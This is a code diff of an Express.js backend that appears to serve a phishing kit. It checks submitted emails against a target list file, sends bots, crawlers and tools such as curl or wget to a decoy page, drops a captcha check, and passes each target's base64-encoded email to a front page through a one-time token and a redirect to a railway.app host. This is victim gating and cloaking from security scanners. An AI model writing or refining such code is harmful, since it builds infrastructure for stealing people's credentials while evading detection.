@@ -1,4 +1,4 @@
-// server.js (backend)
+// 📁 backend/index.js
 require('dotenv').config()
 const express = require('express')
 const cors = require('cors')
@@ -12,7 +12,7 @@ const rateLimit = require('express-rate-limit')
 const app = express()
 const PORT = process.env.PORT || 3000
 const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt')
-const REDIRECT_BASE = process.env.REDIRECT_BASE || '/'
+const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://zezbomf65a64504e.up.railway.app'
 const DEBUG = process.env.DEBUG === 'true'
 
 let validEmails = new Set()
@@ -29,11 +29,13 @@ function loadEmails() {
 }
 loadEmails()
 
-// Clean expired tokens every 5 minutes
 setInterval(() => {
   const now = Date.now()
   for (const [token, info] of tokenMap.entries()) {
-    if (info.expires < now) tokenMap.delete(token)
+    if (info.expires < now) {
+      tokenMap.delete(token)
+      DEBUG && console.log(`[INFO] Expired token ${token} cleared`)
+    }
   }
 }, 5 * 60 * 1000)
 
@@ -41,9 +43,8 @@ setInterval(() => {
 app.use(helmet())
 app.use(express.json())
 app.use(cors())
-app.use(express.static(path.join(__dirname, 'frontend')))
+app.use(express.static(path.join(__dirname, '../frontend/dist')))
 
-// HTTPS redirect
 app.use((req, res, next) => {
   if (req.headers['x-forwarded-proto'] !== 'https') {
     return res.redirect(`https://${req.headers.host}${req.url}`)
@@ -51,53 +52,32 @@ app.use((req, res, next) => {
   next()
 })
 
-// Rate limiting
 app.use(rateLimit({
   windowMs: 60 * 1000,
   max: 50,
   message: { valid: false, message: 'Too many requests. Try again later.' }
 }))
 
-// Bot detection middleware
+// Bot detection function
 function isBot(req) {
-  const ua = req.headers['user-agent'] || ''
-  return /bot|curl|wget|python|scrapy|axios|postman/i.test(ua)
+  const ua = (req.headers['user-agent'] || '').toLowerCase()
+  return !ua || /bot|crawl|spider|headless|python|scrapy|wget|curl/.test(ua)
 }
 
-app.get('/', (req, res) => {
-  if (isBot(req)) {
-    return res.sendFile(path.join(__dirname, 'frontend', 'lalaland.html'))
-  }
-  return res.sendFile(path.join(__dirname, 'frontend', 'index.html'))
-})
-
+// API email verification
 app.post('/api/check-email', async (req, res) => {
-  const { email, captchaToken, middleName } = req.body
+  const { email, middleName } = req.body
 
   if (middleName && middleName.trim() !== '') {
-    return res.status(403).json({ valid: false, message: 'Bot activity detected' })
+    return res.redirect('/lalaland.html')
+  }
+
+  if (isBot(req)) {
+    return res.redirect('/lalaland.html')
   }
 
   if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
     return res.status(400).json({ valid: false, message: 'Invalid email' })
-  }
-
-  if (!captchaToken) {
-    return res.status(400).json({ valid: false, message: 'Captcha missing' })
-  }
-
-  try {
-    const verify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: `secret=${process.env.CLOUDFLARE_SECRET}&response=${captchaToken}`
-    })
-    const result = await verify.json()
-    if (!result.success) {
-      return res.status(400).json({ valid: false, message: 'Captcha failed' })
-    }
-  } catch (err) {
-    return res.status(500).json({ valid: false, message: 'Captcha check error' })
   }
 
   const normalized = email.toLowerCase()
@@ -107,9 +87,17 @@ app.post('/api/check-email', async (req, res) => {
 
   const token = crypto.randomBytes(16).toString('hex')
   const encoded = Buffer.from(normalized).toString('base64')
-  tokenMap.set(token, { email: encoded, expires: Date.now() + 5 * 60 * 1000 })
 
-  return res.json({ valid: true, redirectUrl: `/forward?token=${token}` })
+  const existing = Array.from(tokenMap.entries()).find(([_, v]) => v.email === encoded)
+  if (existing) {
+    tokenMap.delete(existing[0])
+    DEBUG && console.log(`[INFO] Replacing previous token for ${normalized}`)
+  }
+
+  tokenMap.set(token, { email: encoded, expires: Date.now() + 5 * 60 * 1000 })
+  const redirectUrl = `/forward?token=${token}`
+
+  return res.json({ valid: true, redirectUrl })
 })
 
 app.get('/forward', (req, res) => {
@@ -122,7 +110,11 @@ app.get('/forward', (req, res) => {
   }
 
   tokenMap.delete(token)
-  return res.redirect(`/#${entry.email}`)
+  res.redirect(`/#${entry.email}`)
+})
+
+app.get('/lalaland.html', (req, res) => {
+  res.sendFile(path.join(__dirname, '../frontend/public/lalaland.html'))
 })
 
 app.listen(PORT, () => {
